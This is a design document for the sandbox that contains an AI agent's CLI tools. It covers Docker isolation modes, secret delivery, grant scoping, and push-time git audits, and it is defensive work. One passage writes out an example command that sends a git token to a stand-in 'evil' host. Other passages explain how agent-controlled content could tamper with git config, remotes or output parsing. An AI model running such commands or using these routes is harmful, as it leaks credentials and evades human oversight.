# Sandboxing architecture

Jhin executes every `cli.*` call in a fresh, ephemeral, locked-down Docker
container. The control path is `tool-worker → sandbox-runner`; model reasoning
never receives Docker authority, runner credentials, or an executable connector
catalog.

## Components and execution path

```text
services/tool_worker/             policy, connector execution, runner client
services/sandbox_runner/          authenticated job API and Docker lifecycle
  rootless_transport.py           fixed rootless TCP-to-Unix adapter entrypoint
packages/connectors/.../cli/      five cli.* tool definitions and executors
docker/sandbox.Dockerfile         default job image (jhin-sandbox:latest)
packages/db/.../models/sandbox.py durable sandbox_job projection
```

```text
model response                                                [agent-worker]
  → atomically bind the ordered canonical tool manifest       [agent-worker]
  → schema, live grant, scope, policy, and approval            [tool-worker]
  → stable ToolCall claim and connector execution             [tool-worker]
  → authenticated internal job request                        [sandbox-runner]
  → fresh job container, then forced removal                  [Docker]
  → sanitized durable transcript/timeline projection          [agent-worker]
```

The agent process handles the model and private reasoning record. It does not
import connector executors, hold `SANDBOX_RUNNER_URL` or
`SANDBOX_RUNNER_TOKEN`, or join the Compose `runner` network. The tool worker
holds the master key needed for short-lived connector resolution and reaches
the runner over that private network. Only the runner or the fixed rootless
adapter receives Docker authority.

## Three mutually exclusive Docker modes

The base Compose file intentionally supplies no Docker endpoint. Every start,
render, recreate, or upgrade must use `compose.yaml` plus exactly one of
`compose.rootless.yaml`, `compose.rootful.yaml`, and `compose.desktop.yaml`.
Base-only and multi-overlay stacks fail the boundary contract. Operator
commands disable implicit `.env` loading so an old local mode or production
value cannot silently select authority.

| Mode | Host | Runner reaches Docker through | Extra runner group | Daemon identity check | Intended use |
| --- | --- | --- | --- | --- | --- |
| `rootless` | Linux | fixed `rootless-docker-transport` adapter on the internal `engine` network | none | `SecurityOptions` contains `name=rootless`, cgroup v2, systemd driver | servers and CI |
| `rootful` | Linux | root-owned non-symlink socket mounted at `/run/jhin/docker.sock` | exact `SANDBOX_DOCKER_GID` of that socket | not rootless | servers and CI |
| `desktop` | macOS / Windows Docker Desktop | VM socket mounted at `/run/jhin/docker.sock` (`uid 0 / gid 0`) | root group `0` | `OperatingSystem` contains `Docker Desktop`, not rootless | local development only |

In every mode, `sandbox-runner` has the exact runtime identity `10001:10001`,
drops every capability, is non-privileged, and has
`no-new-privileges:true`. Its Docker authority is validated before it creates
the sandbox network or reaps any artifact. A version probe and daemon identity
probe must pass first; failed startup closes the Docker client and performs no
mutation. `SANDBOX_DOCKER_MODE` has no default: an omitted or unknown mode is
a configuration error.

### Rootless mode

Rootless mode runs the entire stack against an already-running rootless daemon
whose host Unix socket is owned by UID 10001. Host preflight uses `lstat` and
rejects a relative path, symlink, non-socket, wrong owner, or daemon whose
security options omit `name=rootless`.

The `rootless-docker-transport` adapter alone mounts that socket. Its container
identity is `0:0`, but only inside the rootless daemon's user namespace:
container UID 0 maps to the unprivileged host daemon user. The adapter is
non-privileged, drops all capabilities, is read-only apart from `/tmp`, accepts
no arguments or Docker-related environment override, has no supplemental group, and exposes only the fixed private endpoint
`http://rootless-docker-transport:2375` on the internal `engine` network.

The adapter and runner use the exact same explicit local image tag. Operators
build `sandbox-runner` before the adapter can start, and the adapter declares
`pull_policy: never`; it cannot fetch an unreviewed image independently. The
adapter's health check performs a real Docker `GET /_ping` and requires status
200 with body `OK`. The runner starts only after that service is healthy, then
its own `/health` performs a daemon-backed ping.

Compose health alone does not restart an unhealthy container. An upstream or
copy failure therefore makes the adapter exit; `restart: unless-stopped`
relaunches it. The runner reports HTTP 503 while Docker connectivity is absent.
An explicit adapter restart also restarts the dependent runner through the
Compose dependency contract. The adapter must become healthy before runner
readiness is accepted.

### Rootful mode

Rootful mode mounts one operator-verified Docker Unix socket directly into the
runner at `/run/jhin/docker.sock`. The host path must be absolute, must not be a
symlink, must be a socket owned by UID 0, and must have an exact positive
numeric group. `SANDBOX_DOCKER_GID` must equal that `lstat` group and becomes
the runner's sole additional group authority. The runner verifies effective
read/write access. Wrong path, type, owner, GID, access, identity, or any extra
group is a fatal startup error; the deployment must repair its Docker setup,
not weaken permissions or elevate the service.

The rootful mode has no daemon-service dependency: there is no adapter or
`engine` network member, and runner health talks to the mounted socket. It does
not inherit a rootless transport URL.

### Desktop mode (macOS / Windows, local development only)

Docker Desktop runs the daemon inside a Linux VM. On the host,
`/var/run/docker.sock` is a compatibility symlink to a user-owned socket under
`~/.docker/run/`; inside any container that mounts it, the same endpoint is a
Unix socket owned by `uid 0 / gid 0`. Neither the rootful contract (real
root-owned non-symlink socket with a positive docker GID) nor the rootless
contract (host UID 10001 daemon) can be satisfied, so `desktop` is an explicit,
opt-in third mode rather than a relaxation of the other two.

`compose.desktop.yaml` mirrors the rootful overlay: it bind-mounts
`${SANDBOX_DOCKER_SOCKET_HOST:-/var/run/docker.sock}` at
`/run/jhin/docker.sock`, sets `SANDBOX_DOCKER_MODE=desktop`, supplies no
`SANDBOX_DOCKER_GID` and no transport URL, and adds exactly `group_add: ["0"]`.
The runner still runs as `10001:10001` with every capability dropped and
`no-new-privileges:true`; at startup it requires the mounted path to be an
absolute, non-symlink Unix socket owned by UID 0 and GID 0, requires the root
group to be its only supplemental group, verifies effective read/write access,
and then requires the daemon reached through that socket to report an
`OperatingSystem` containing `Docker Desktop`. A Linux host daemon, a rootless
daemon, a symlink, a foreign GID, an extra group, or a configured
`SANDBOX_DOCKER_GID` is a fatal startup error. Job constraints (network policy,
identity, limits, cleanup, secret redaction) are identical to the other modes.

Host preflight in the harness and in `assert_phase10_tool_worker_compose.py
--mode desktop` is the one place a symlink is accepted: the configured path is
resolved to its real socket target, that target becomes the immutable
snapshotted authority and the bind-mount source, and `docker info` must report
Docker Desktop and no `name=rootless` option.

**Desktop harness caveats.** Two behaviours of the Docker Desktop daemon
differ from a Linux daemon and are handled explicitly rather than skipped:
the runner container reports `GroupAdd: ["0"]` (the root group, because no
socket GID exists), which the live boundary assertions expect only in
`desktop` mode; and BuildKit may assign distinct image IDs to identical
per-service builds that run in parallel, so the upgrade overlay gives every
current worker of one kind one explicit `image` tag
(`jhin-phase10-{agent,tool}-worker:<token>`) that the harness builds exactly
once before recreating the four services with `--no-build`.

**Threat-model caveat.** Root-group membership inside the runner container is
strictly weaker than the rootful exact-GID or the rootless user-namespace
boundary: any file in the runner image that is group-`0` writable becomes
reachable, and the socket grants full control of the Desktop VM daemon, which
already belongs to the developer. That is acceptable for a single developer's
laptop and nothing else. Never select `desktop` on a shared host, a server, or
CI; the mode exists so that `make test-integration PHASE10_MODE=desktop` and
the full stack (including CLI sandbox jobs) run on Docker Desktop with the
same fail-closed startup contract.

### Readiness

Startup uses bounded `up -d --build --wait --wait-timeout` and then `ps --all`
with the exact service set for the selected mode. Rootless requires
`rootless-docker-transport` in addition to the base production services;
rootful and desktop forbid it. Every returned row must be running, and every service with
a health check must be healthy. Absence, duplicate rows, exited services,
blank health, or extra mode-specific services fails closed. Phase 10 Task 10
owns the current-image live start, recreate, crash, and upgrade acceptance
commands; static render success alone is not live acceptance.

## Network and endpoint isolation

Compose owns explicit nonexternal bridge networks. The global `runner` network
contains exactly the tool worker and runner. In rootless mode, the internal
`engine` network contains exactly the adapter and runner. The API, agent,
workflow, and event workers join neither network.

Job containers receive no socket, adapter endpoint or DNS, engine or runner network, Docker-related environment authority, or supplemental group. They
cannot resolve the tool worker, adapter, runner, agent worker, API, database,
NATS, or Temporal by control-plane DNS. Host inspection in the live security
gate checks the actual container's user, network mode, `GroupAdd`, environment,
mounts, and exact job label instead of relying on an in-container guess.

Two job network policies are available:

- **`none`** uses Docker `NetworkMode: none`; the job has no external or
  control-plane network access.
- **`internet`** joins the configured dedicated sandbox bridge. The name must
  satisfy the bounded safe grammar, must not be a Docker reserved/container
  mode, and must not alias any authority network. No production control service
  is attached to it.

The dev overlay attaches only `fake-github` to the sandbox network for
integration tests. This test exception must never be copied to a production
service.

## Job isolation

Every job container is created with this fixed security shape:

| Control | Value |
| --- | --- |
| User | exact `1000:1000` |
| Root filesystem | read-only |
| Writable storage | one named per-run workspace volume, plus bounded tmpfs |
| Capabilities | `CapDrop: ALL`, nothing added |
| Privilege | non-privileged and `no-new-privileges:true` |
| Groups | empty `GroupAdd` |
| CPU / memory / pids | capped at 2 CPUs / 4 GiB / 256 pids |
| Timeout | capped at 30 minutes, then force-killed |
| Host authority | no host bind, Docker socket, adapter URL, or control network |
| Cleanup | force-removed in `finally`, with startup orphan reaping by exact label |

One job gets one fresh container. A repository checkout persists only in the
named volume `jhin-sandbox-ws-run-<run_id>`, mounted at `/workspace`. Tool-worker
requests `DELETE /v1/workspaces/run-<id>` before the agent-side final projection;
the deletion is idempotent and startup reaping removes old volumes as a
backstop.

Stdout and stderr have independent byte caps. The runner registers every
job-scoped secret value, redacts it before returning output, and forgets it with
the job. Tool-worker applies its process redactor again before persisting a
`sandbox_job` row or tool result.

## Secret split

The caller resolves and the runner relays:

1. Tool-worker reloads the authorized connection and decrypts or mints the
   short-lived credential.
2. It sends the value in `secret_env` over the private runner network.
3. The runner injects it only while creating the job, redacts captured output,
   and retains no master key or database credential.

This keeps secret-store authority and Docker authority in different processes.
Only `cli.repository.checkout` and `cli.repository.push` ever carry
`GIT_TOKEN`, and both run scripts Jhin wrote. The token reaches git through an
inline `credential."<git base>".helper` on Jhin's own command line, so it is
never in a remote URL, never in repository config, and never in a file the
agent can rewrite.

## CLI connector policy

| Tool | Risk | Scope keys (all fnmatch) | Required scope keys |
| --- | --- | --- | --- |
| `cli.command.execute` | write, approvable | connection, command, image, network | — |
| `cli.repository.checkout` | write, approvable | connection, repository, image | connection, repository |
| `cli.repository.push` | **elevated**, approvable | connection, repository, branch | connection, repository, branch |
| `cli.test.run` | write, approvable | connection, command, image | — |
| `cli.file.list` | read | connection, path | — |
| `cli.file.search` | read | connection, path | — |
| `cli.file.read` | read | connection, path | — |
| `cli.file.edit` | write, approvable | connection, path | — |
| `cli.file.write` | write, approvable | connection, path | — |

A CLI connection stores defaults, an optional GitHub connection reference, and
the repositories it may use — not a plaintext credential. Deny-by-default
remains in force in three independent places: the agent's grants, the
connection's `allowed_repositories` (enforced by a `ToolValidator` that re-runs
at policy decision, approval resume and execution bind, so narrowing the list
invalidates a parked approval), and the scope of the GitHub token itself.

`repository` is always `owner/name`, and neither half may be made of dots
alone: a `..` segment reads as an ordinary name to a pattern like
`[\w.-]+/[\w.-]+` and as a directory traversal to everything that joins the
value onto a path — the clone URL, and the `/repos/<repository>` paths the
GitHub tools build — which would walk out of the prefix the credential's scope
was written around. Allow-list entries are matched a segment at a time for the
same reason (`fnmatch`'s `*` crosses `/`, so `octo*` would otherwise cover
`octo-labs/anything`); the single entry `*`, which migration 0038 grandfathers
onto connections that predate the list, still means every repository — but
never a name that is not one. A
grant that pins `image` or `network` matches only a call that explicitly
carries that field; relying on a connection default does not broaden the grant.

## Giving an agent code work

An agent edits code only inside a sandbox job, and the change reaches the
repository only through `cli.repository.push` — a script Jhin writes, not a
command the agent writes. The way in is the **Code editing** capability
bundle: the setup dialog on the agent's Tools & Access tab (or **Give to an
agent…** on the GitHub connection), or `jhin-admin agent grant --bundle
code-editing --create-sandbox` on the console
([agent-access](../operations/agent-access.md)). Either one does the setup
below in one transaction and refuses, by sentence, anything the gateway would
deny anyway.

1. **Connections.** A `github` connection (a fine-grained PAT is the shortest
   path) for the repository, and a `cli` connection (auth type `none`) whose
   `git_connection_id` points at it and whose **`allowed_repositories`** lists
   the repositories this instance may touch. The bundle creates the `cli`
   connection for you, pointing at the GitHub connection you chose, with the
   allow-list you gave it (`*` for every repository the token can reach); it
   can be narrowed later on the connection (`PATCH /connections/{id}/config`,
   the *Allowed repositories* editor under Apps). That list is deny-by-default:
   a CLI connection with an empty list can neither check out nor push
   anything, and a grant naming a repository outside it is refused when it is
   written. Scope the GitHub token to the same repositories — Jhin's
   allow-list is the one you can edit, GitHub's is the one that cannot be
   argued with. Leave `default_network` at `none`; only checkout and push
   reach the bridge, and they set that themselves.
2. **Grants** (what the bundle writes; the rows are ordinary grants and show
   under Capability grants):

   | Capability | Scope | Why |
   | --- | --- | --- |
   | `cli.repository.checkout` | `connection_id`, `repository` | clone + create the `agent/<task>-<repo>` branch |
   | `cli.file.list` | `connection_id`, `path` | see what is in the repository |
   | `cli.file.search` | `connection_id`, `path` | find a symbol before reading it |
   | `cli.file.read` | `connection_id`, `path` | read a page of a file, with a `read_token` |
   | `cli.file.edit` | `connection_id`, `path` | change part of a file by exact string |
   | `cli.file.write` | `connection_id`, `path` | write a whole file (needs the `read_token`) |
   | `cli.test.run` | `connection_id`, `command` | run the test command, always isolated |
   | `cli.repository.push` | `connection_id`, `repository`, `branch: "agent/*"` | commit and push the working branch |
   | `github.repository.read` | `connection_id`, `repository` | inspect the repository |
   | `github.pull_request.read` | `connection_id`, `repository` | read pull requests |
   | `github.pull_request.create` | `connection_id`, `repository`, `base: "*"` | open the PR from the pushed branch |

   `connection_id` and `repository` are **required** grant scope keys on
   checkout and push: a bare `cli.*` grant cannot reach a repository, and
   `POST /grants` now refuses a row that lacks a required key rather than
   writing one the gateway denies on every call. `base` defaults to `*`
   (any base branch); the dialog's *Advanced* step narrows it.
   Deleting a connection revokes every grant pinned to it (each audited with
   `reason: connection.deleted`), and a grant pinned to a connection that is
   not active is not advertised to the model at all — disabling revokes
   nothing, so re-enabling brings the tools back.
   `cli.command.execute` is deliberately **not** in this bundle. It remains in
   the product as an operator-granted escape hatch for builds and linters, and
   it never receives a git credential.
3. **Step budget.** A checkout → list → search → read → test → edit → test →
   push → PR flow is nine calls before the agent reports back; give the agent
   at least 12 steps.

### Why push is its own tool

A grant scope is one `fnmatch` over a shell string, so `command: "git *"` also
matches `git commit -m x && curl https://evil/?t=$GIT_TOKEN`. No scope on a
shell string is a boundary. So the tools that hold the credential run scripts
Jhin writes, and the model supplies no remote, no refspec and no shell. Before
`cli.repository.push` pushes anything it checks, in order:

0. Jhin's own audit trail carries a `sandbox.checkout.recorded` row for this
   run naming this repository (`no_checkout_record`). The checkout writes it —
   base ref, head sha, and the sha256 of `.git/config` as Jhin left it — into a
   table no sandbox job can reach. Every check below that needs to know what
   the repository *should* look like reads it from there. The row is written
   only when all three values are there and well-shaped, and the push refuses
   a record missing either the base ref or the config sha rather than dropping
   the comparison that needs it: an incomplete record is no record.
1. `/workspace/repo` exists (`no_checkout`);
2. the branch it was asked to push is the one checked out
   (`branch_not_checked_out`);
3. the branch is neither `main`, `master`, `HEAD`, nor **the base ref the
   checkout recorded** (`push_to_base_refused`). Not
   `refs/remotes/origin/HEAD`: that is the remote's default branch, which is a
   different question, and it is a ref inside the repository the agent has been
   editing;
4. `git config --local` contains only keys a Jhin checkout produces — any
   `credential.*`, `url.*.insteadOf`, `http.*`, `core.hooksPath`,
   `core.sshCommand`, `include.*` or `alias.*` stops the push
   (`repo_config_tampered`, recorded as the audit action
   `sandbox.repo_config_tampered`, which is a security event and not merely a
   tool error);
5. `remote.origin.url` holds **exactly one** value and it is the URL Jhin
   cloned (`remote_rewritten`). Counting matters: the key is allowed, so a
   name-only audit passes a remote that has been given a second URL, and
   `git remote get-url origin` reports only the first by design while
   `git push origin` delivers to every one of them. The refusal records the
   URLs it saw, so the audit names where the objects would have gone;
6. `.git/config` hashes to the sha the checkout recorded
   (`repo_config_tampered`). This is the catch-all under 4 and 5: whatever a
   sandbox job did to the file, and by whatever key nobody enumerated, it is
   not what Jhin left there.

Then the push itself goes to **the URL Jhin computes**, not to the name
`origin`:

```
git … push <clone url> refs/heads/<branch>:refs/heads/<branch>
```

`origin` is a pointer the container owns; the URL is Jhin's. So even with every
audit above bypassed, a rewritten remote redirects nothing. The push is never
forced, and the refspec is always `refs/heads/<branch>:refs/heads/<branch>`.

**Nothing in this list asks the container a question it could lie about.** That
is the rule the whole tool is built on, because between the model's last visible
action and the human's approval sits `cli.test.run`, whose command is arbitrary
and whose working directory is the checkout.

### How the credential is delivered

The token is resolved from the GitHub connection named by the CLI connection's
`git_connection_id` — admin-set, never chosen by a tool call — and injected as
job-scoped `secret_env["GIT_TOKEN"]`. Jhin's own git command line then carries:

```
git -c credential.helper= \
    -c credential."<git base>".helper='!f() { test "$1" = get && { echo username=x-access-token; echo "password=$GIT_TOKEN"; }; }; f' \
    -c core.hooksPath=/nonexistent <clone|push …>
```

- the empty `credential.helper=` resets the inherited helper list, so a helper
  planted anywhere else cannot answer first;
- git's own URL matcher decides whether the helper runs, so a push to any other
  host never invokes it;
- the fallbacks are `GIT_ASKPASS=/bin/false` and `GIT_TERMINAL_PROMPT=0`, both
  hard errors, so the token is unreachable rather than merely un-echoed;
- the helper lives on a command line, not in `.git/config`, so it is not in a
  file the agent can rewrite and it never persists.

Every credentialed job also sets `GIT_CONFIG_NOSYSTEM=1` and
`GIT_CONFIG_GLOBAL=/dev/null`, so neither a system config nor a planted
`/workspace/.gitconfig` can contribute a helper.

### `.git` is not reachable through the file tools

Every file tool refuses git's own state three times:

1. `cli/schemas.py` rejects any path with a `.git` segment, a first segment of
   `.git`/`.gitconfig`/`.gitmodules`, or anything starting `.jhin`;
2. each file job re-resolves the path with `realpath` inside the sandbox before
   touching it, so a symlink named something innocent cannot smuggle a write
   into `.git` or out of the checkout;
3. the same guard refuses a regular file whose link count is not 1.

The third is the one the first two cannot do. `ln .git/config cfg` creates no
symlink and adds no path segment: the schema is shown `cfg`, `realpath`
resolves `cfg` to `<root>/cfg`, and both are telling the truth about a file
that is also git's. Writing it truncates the shared inode. A regular file the
file tools may touch has exactly one name; `cli.file.edit` asks its own open
descriptor (`os.fstat`), so no link can appear between the check and the write.

`.github/**`, `.gitignore` and `.gitattributes` stay editable — they are
ordinary repository content, and the config-based attacks they might otherwise
enable are closed by the environment above and by the push-time config audit.

### Approvals

`cli.repository.push` is `ELEVATED`. Under the wizard's default **balanced**
preset — and under the risk defaults a new agent has before any policy is set —
that means a human approves the first thing that leaves the sandbox, while
everything before it runs uninterrupted. **Autonomous runs ELEVATED tools
automatically**, so the Code-editing bundle also ships an explicit policy rule
(`capability: "cli.repository.push", action: "approval"`), written both by the
agent wizard and by the **Code editing** toggle on an agent's Tools & Access
tab. A capability-matched rule is found before a risk-matched one, so the gate
holds under Autonomous.

It also survives a later change of mode. An approval **preset** is a statement
about risk levels — every rule it expands to is `capability: "*"` — so
`PUT /policy {"preset": …}` (the chat sidebar's mode buttons and the same
buttons on Tools & Access) restates those rules and keeps the ones a preset
does not speak for, at the front of the list where first-match reaches them.
The preset still reads as selected in the UI while such a rule is present, so
nothing invites a click to "fix" an unselected-looking mode.

Two ways the gate is still absent, both deliberate and both visible on the
Permissions tab: an agent configured by hand under Autonomous that never
received the rule, and one whose rules were edited explicitly —
`PUT /policy {"rules": […]}` persists exactly the list it is given, and that
is how a rule is deliberately removed.

`github.pull_request.create` stays `WRITE`/auto: push is the gate, and
prompting twice for one logical action is worse than not.

### Images and networks

`cli.test.run` always runs with `network: "none"`. Its command is arbitrary and
its working directory is the checkout, so the egress decision is Jhin's, not the
model's. It is **WRITE** risk for the same reason: it is named after tests, but
it is a shell that can change any file in the checkout, and a grant scope is one
`fnmatch` over the string — `"python3 -m pytest*"` matches
`python3 -m pytest -x; <anything>`. WRITE still runs unattended under Autonomous
and Balanced, which is deliberate; Restricted, which promises no unattended
writes, now sees it. Containment is structural rather than risk-level:
`cli.repository.push` trusts nothing this command could have touched.
Operators who need networked
tests grant `cli.command.execute` with a narrow command scope instead.

Images are pre-built on the Docker host and selected by the `image` scope key.
**The runner never pulls**, so a grant's `image` value can never reach a
registry.

### How a job reports back

Everything Jhin learns from a job — the checkout's head, base and config sha,
a file's line count and `read_token`, the shas a push moved — arrives as a
trailer on the job's stdout, after the payload because the runner keeps the
*tail* of oversized output. That makes the parser, not the position, the thing
that has to be trustworthy, because repository content shares the stream:
`git` allows a newline in a file name, so a repository can hold a file called
`z⏎JHIN_META` and print a second trailer through any listing of it. Four
rules, all four needed:

- the sentinel carries a **nonce Jhin draws per job**, which nothing in the
  container can predict;
- it must appear **exactly once** — two sentinels mean the stream is ambiguous,
  and an ambiguous trailer is discarded rather than resolved in favour of
  whoever printed last;
- **no content-derived byte is printed inside the region**: every value a
  repository decides — the checkout's top-level listing, `cli.file.list`'s
  rows, `cli.file.search`'s matches — is collected before the sentinel and
  emitted as a single base64 word, so a file name cannot contribute a line
  break, a key, or a sentinel of its own. Inside the encoding the records are
  NUL-separated, because NUL is the one byte a path cannot hold: a tab or a
  colon in a name is then data rather than a field separator, and
  `cli.file.search` runs `grep -Z` so grep terminates the name with a NUL
  instead of the `:` the parser used to split on;
- **exactly one thing emits the sentinel.** A second emitter is how a sentinel
  and its parser drift apart, and the drift is silent — the trailer simply
  stops being found and every value read from it comes back empty.
  `cli.file.edit` shipped that way: the Python program that does the edit wrote
  the pre-nonce bare marker while the tool parsed the nonce form, so its
  documented `read_token` was always `""` and the follow-up `cli.file.write`
  was refused with `file_exists_pass_read_token`. The program now writes only
  `key=value` lines into a variable and the shell prints the sentinel ahead of
  them, exactly as every other tool does.

A job whose trailer cannot be read reports nothing rather than something: the
checkout refuses (`checkout_unrecordable`) and writes no record, which leaves
the next push with nothing to trust and refuses that too. A listing whose word
was cut by the size cap reports the rows it could read and says `truncated`.

Refusals travel the other way, as a `JHIN_ERR=` line on stderr, and that stream
is shared with `git` — which prints file names verbatim. So a `JHIN_ERR` line
counts only when the job exited with one of the codes Jhin's own scripts
reserve (65-69). Everything those codes name is reported as *proven side-effect
free*, and a push that died after touching the remote exits with git's code,
never one of these.

What the agent sees: the checkout returns the working branch, the base ref it
was cut from, and the top-level entries, so it can start navigating a
repository nobody handed it a file path for. Names in every listing are
repository content, so any character Python does not consider printable is
shown as `?` — the file tools' schema refuses such a path anyway. That is a
wider net than "below U+0020" on purpose: `str.splitlines` also breaks on
U+000B, U+000C, U+001C–U+001E, U+0085 and U+2028/U+2029, so a name carrying one
of those would otherwise look like one line where it was escaped and like two
everywhere after. `cli.file.read` returns a line
window plus `total_lines`, `has_more` and a `read_token` — the sha256 of the
whole file, computed in the sandbox — and `cli.file.write` requires that token
back, so reading part of a file and writing back what you read is refused
rather than silently destroying the rest. The fake GitHub (like real GitHub)
refuses a pull request whose head has no commits beyond the base, so a branch
created through the refs API without a push cannot produce an empty PR.

## Configuration ownership

| Variable | Owner | Meaning |
| --- | --- | --- |
| `SANDBOX_RUNNER_TOKEN` | tool-worker + runner | bearer token; an empty value denies requests |
| `SANDBOX_RUNNER_URL` | tool-worker | fixed internal runner base URL |
| `SANDBOX_DEFAULT_IMAGE` | tool-worker + runner | reviewed default job image |
| `SANDBOX_NETWORK` | runner | unique dedicated bridge for `internet` jobs |
| `SANDBOX_RUNNER_IMAGE` | Compose | identical local runner/adapter image tag |
| `PHASE10_ROOTLESS_DOCKER_SOCKET` | rootless overlay | verified host-UID-10001 daemon socket; no GID applies |
| `SANDBOX_DOCKER_SOCKET_HOST` | rootful + desktop overlays | rootful: verified absolute root-owned non-symlink socket; desktop: resolved Docker Desktop socket (default `/var/run/docker.sock`) |
| `SANDBOX_DOCKER_GID` | rootful overlay | exact positive numeric group of that socket; forbidden in desktop mode |
| `PHASE10_DESKTOP_DOCKER_SOCKET` | desktop harness preflight | host path (symlink allowed) resolved to the real Docker Desktop socket |
| `SANDBOX_MAX_*` | runner | hard CPU, memory, pids, timeout, and output caps |

The runner and adapter receive no master key, database DSN, NATS credentials,
or connector allowlist. Job requests are filtered so `DOCKER_*`,
`SANDBOX_DOCKER_*`, known socket paths, and adapter endpoint values cannot be
forwarded even if a caller attempts to provide them.

## Host support

The two server-grade authority modes are Linux rootless Docker with host UID
10001 and Linux rootful Docker with a real root-owned non-symlink socket. A
Docker Desktop compatibility symlink does not satisfy the rootful contract; on
macOS or Windows use the explicit, development-only `desktop` mode described
above. Nested Docker-in-LXC is safe only when the outer host provides secure
nested-container isolation; a permissive nesting configuration can void every
guarantee above.
